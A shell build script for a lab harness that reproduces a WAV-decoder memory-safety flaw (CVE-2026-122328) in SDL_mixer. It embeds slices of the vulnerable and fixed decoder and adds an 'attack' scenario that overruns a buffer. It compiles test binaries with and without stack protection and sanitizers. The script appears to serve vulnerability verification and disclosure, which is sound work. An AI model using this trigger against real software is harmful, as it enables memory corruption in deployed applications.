#!/bin/sh
# sdlmixer2shell real-caller harness (CVE-2026-122328).
# Verbatim pinned slices: WAV types, StandardSDLWavChannelMask, ParseFMT,
# FetchXLaw(+FetchULaw/FetchALaw) and WAV_GetAudio's :1654-1679 fetch block.
# Real SDL3 3.2.4 SDL_IOFromMem/SDL_ReadIO supplies the sample count, real
# ParseFMT sets framesize/decoded_framesize from a synthetic WAV fmt chunk,
# and SDL_CreateAudioStream/SDL_PutAudioStreamData is the consumer.
# Lab-only: conversion LUT arrays (chosen 0x5a5a5a5a bit pattern) and driver.
# No SDL_mixer build, no full WAV chunk dispatcher, no socket/wire, no RCE.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$(CDPATH= cd -- "$HERE/../.." && pwd)
SRC="$ROOT/src"
DEPS="$ROOT/deps"
SDLROOT="$DEPS/SDL-release-3.2.4"
SDLLIB="$SDLROOT/build"
SDLINC="-I$SDLROOT/include -I$SDLROOT/build/include-config-release -I$SDLROOT/build/include-revision"
mkdir -p "$HERE/evidence"

(cd "$ROOT" && sha256sum -c PINS.sha256 >/dev/null)
(cd "$DEPS" && printf '%s  %s\n' '0fc1d23e225e2a098976571bf5d62b6d81e0ae84ff3d82a35a3d19ab04d07e5c' 'SDL3-release-3.2.4.tar.gz' | sha256sum -c - >/dev/null)
test -f "$SDLLIB/libSDL3.so" || { echo "build SDL3 first (see PROVENANCE.md)" >&2; exit 1; }

gen_driver() { # vuln|fixed
    v=$1
    tag="decoder_wav.c.$v"
    src="$SRC/decoder_wav.c.$v"
    out="$HERE/real-driver-$v.cpp"
    if [ "$v" = vuln ]; then caller_start=1654; else caller_start=1666; fi
    caller_end=$((caller_start + 25))
    {
        cat <<'HEADER'
/* Generated by harness/realcaller/run.sh. Upstream bytes only in #line regions. */
#include <SDL3/SDL.h>
#include <cstdio>
#include <cstring>

/* Lab stub: real SDL_mixer defines these tables elsewhere; chosen marker bits. */
static float g_lab_lut[256];
static const float *const MIX_ulawToFloat = g_lab_lut;
static const float *const MIX_alawToFloat = g_lab_lut;
HEADER
        printf '\n#line 41 "%s"\n' "$tag"
        sed -n '41,230p' "$src"
        cat <<'STUBS'

/* Lab stubs for sibling fetchers referenced by verbatim ParseFMT. */
static int FetchPCM(WAV_TrackData *, Uint8 *, int) { return 0; }
static int FetchMSADPCM(WAV_TrackData *, Uint8 *, int) { return 0; }
static int FetchIMAADPCM(WAV_TrackData *, Uint8 *, int) { return 0; }
static int FetchPCM24LE(WAV_TrackData *, Uint8 *, int) { return 0; }
static int FetchFloat64LE(WAV_TrackData *, Uint8 *, int) { return 0; }
static bool MS_ADPCM_Init(ADPCM_DecoderInfo *, const Uint8 *, Uint32) { return true; }
static bool IMA_ADPCM_Init(ADPCM_DecoderInfo *, const Uint8 *, Uint32) { return true; }
STUBS
        printf '\n#line 750 "%s"\n' "$tag"
        sed -n '750,772p' "$src"
        printf '\n#line 828 "%s"\n' "$tag"
        sed -n '828,843p' "$src"
        printf '\n#line 845 "%s"\n' "$tag"
        sed -n '845,978p' "$src"
        cat <<'WRAPPER'

/* Lab wrapper around the verbatim caller slice; seekblock is supplied here. */
static bool RealGetAudio(WAV_TrackData *tdata, SDL_AudioStream *stream, const WAVSeekBlock *seekblock)
{
WRAPPER
        printf '#line %d "%s"\n' "$caller_start" "$tag"
        sed -n "${caller_start},${caller_end}p" "$src"
        cat <<'TAIL'
}

int main(int argc, char **argv)
{
    const char *scenario = (argc > 1) ? argv[1] : "safe";
    const Uint32 pattern = 0x5a5a5a5aU;
    for (int i = 0; i < 256; i++) { memcpy(&g_lab_lut[i], &pattern, 4); }
    SDL_SetHint(SDL_HINT_AUDIO_DRIVER, "dummy");
    if (!SDL_Init(SDL_INIT_AUDIO)) {
        printf("SDL_Init failed: %s\n", SDL_GetError());
        return 2;
    }

    /* Synthetic WAV fmt chunk: mono, 8-bit A-law or mu-law, 8000 Hz. */
    Uint16 encoding = ALAW_CODE;
    Uint32 fmtlen = 16;
    if (!strcmp(scenario, "ulaw")) { encoding = MULAW_CODE; }
    if (!strcmp(scenario, "badfmt")) { fmtlen = 4; encoding = ALAW_CODE; }
    if (!strcmp(scenario, "pcm8")) { encoding = PCM_CODE; }

    Uint8 fmt[16] = { 0 };
    fmt[0] = (Uint8)(encoding & 0xff); fmt[1] = (Uint8)(encoding >> 8);
    fmt[2] = 1; fmt[3] = 0;
    fmt[4] = 0x40; fmt[5] = 0x1f; fmt[6] = 0; fmt[7] = 0;       /* 8000 Hz */
    fmt[8] = 0x40; fmt[9] = 0x1f; fmt[10] = 0; fmt[11] = 0;     /* 8000 B/s */
    fmt[12] = 1; fmt[13] = 0;                                   /* blockalign */
    fmt[14] = 8; fmt[15] = 0;                                   /* 8 bits */

    WAV_AudioData adata;
    SDL_memset(&adata, 0, sizeof(adata));
    SDL_AudioSpec spec;
    SDL_memset(&spec, 0, sizeof(spec));
    SDL_IOStream *fmtio = SDL_IOFromMem(fmt, fmtlen);
    const bool parsed = ParseFMT(&adata, fmtio, &spec, fmtlen);
    SDL_CloseIO(fmtio);
    if (!parsed) {
        printf("scenario=%s parse=REJECTED framesize=%d fetch_set=%d\n",
               scenario, adata.framesize, adata.fetch ? 1 : 0);
        SDL_Quit();
        return 0;
    }

    size_t n = 8;
    if (!strcmp(scenario, "edge") || !strcmp(scenario, "attack") ||
        !strcmp(scenario, "ulaw")) { n = 256; }
    if (!strcmp(scenario, "attack")) { n = 512; }
    static Uint8 data[1024];
    memset(data, 0x80, sizeof(data));

    SDL_IOStream *dataio = SDL_IOFromMem(data, n);
    WAV_TrackData tdata;
    SDL_memset(&tdata, 0, sizeof(tdata));
    tdata.adata = &adata;
    tdata.io = dataio;
    tdata.channels = (int)spec.channels;
    WAVSeekBlock seekblock;
    SDL_memset(&seekblock, 0, sizeof(seekblock));
    seekblock.num_frames = 256;   /* 256 frames * 4 decoded bytes = buflen 1024 */

    SDL_AudioStream *stream = SDL_CreateAudioStream(&spec, &spec);
    if (!stream) { printf("SDL_CreateAudioStream failed: %s\n", SDL_GetError()); return 2; }
    const bool rc = RealGetAudio(&tdata, stream, &seekblock);
    printf("scenario=%s encoding=%u n=%zu parse=OK framesize=%d decoded_framesize=%d rc=%d "
           "fetch=%s remaining=%zu\n",
           scenario, (unsigned)encoding, n, adata.framesize, adata.decoded_framesize,
           rc ? 1 : 0,
           adata.fetch == FetchULaw ? "FetchULaw" : (adata.fetch == FetchALaw ? "FetchALaw" : "other"),
           SDL_GetIOStatus(dataio) == SDL_IO_STATUS_EOF ? (size_t)0 : n);
    SDL_DestroyAudioStream(stream);
    SDL_CloseIO(dataio);
    SDL_Quit();
    return 0;
}
TAIL
    } > "$out"
}
for v in vuln fixed; do gen_driver "$v"; done

FLAGS_PLAIN="-g -O0 -fno-omit-frame-pointer -Wall -std=c++17"
FLAGS_ASAN="-g -O0 -fno-omit-frame-pointer -Wall -std=c++17 -fsanitize=address -fno-stack-protector"
FLAGS_NOSSP="-g -O0 -fno-omit-frame-pointer -Wall -std=c++17 -fno-stack-protector"
for cxx in g++ clang++; do
    for v in vuln fixed; do
        for mode in plain asan nossp; do
            case "$mode" in
                plain) flags=$FLAGS_PLAIN ;;
                asan)  flags=$FLAGS_ASAN ;;
                nossp) flags=$FLAGS_NOSSP ;;
            esac
            $cxx $flags $SDLINC -x c++ "$HERE/real-driver-$v.cpp" \
                -o "$HERE/$cxx-$v-$mode" -L"$SDLLIB" -lSDL3 \
                -Wl,-rpath,"$SDLLIB"
        done
    done
done
printf 'built 12 real-caller binaries; pins verified\n'
